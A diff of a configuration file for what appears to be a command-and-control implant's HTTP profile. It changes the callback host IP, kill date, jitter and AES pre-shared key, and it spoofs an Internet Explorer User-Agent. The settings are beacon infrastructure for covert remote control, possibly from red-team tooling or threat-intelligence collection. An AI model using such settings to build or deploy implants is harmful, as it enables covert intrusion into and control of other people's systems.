@@ -1,15 +1,15 @@
 callback_port == "80"
-callback_jitter == "23"
+killdate == "2022-07-28"
 encrypted_exchange_check == "T"
-callback_host == "http://87.3.195.225"
+callback_jitter == "23"
+headers == [{"name": "User-Agent", "key": "User-Agent", "value": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko", "custom": false}]
+AESPSK == {"value": "aes256_hmac", "enc_key": "5cSMXnutVw+Ja8qlhWGfDrd7fsXZAlBE11TmOY3yqos=", "dec_key": "5cSMXnutVw+Ja8qlhWGfDrd7fsXZAlBE11TmOY3yqos="}
+callback_host == "http://95.239.61.225"
+get_uri == "index"
+post_uri == "data"
 query_path_name == "q"
 proxy_host == ""
+proxy_port == ""
+proxy_user == ""
 proxy_pass == ""
 callback_interval == "10"
-killdate == "2022-07-26"
-AESPSK == {"value": "aes256_hmac", "enc_key": "Teb2sZ7vclKfPDVza4Q/TiFbKsyZFjfcTWE9qi6LcAc=", "dec_key": "Teb2sZ7vclKfPDVza4Q/TiFbKsyZFjfcTWE9qi6LcAc="}
-post_uri == "data"
-proxy_user == ""
-headers == [{"name": "User-Agent", "key": "User-Agent", "value": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko", "custom": false}]
-get_uri == "index"
-proxy_port == ""
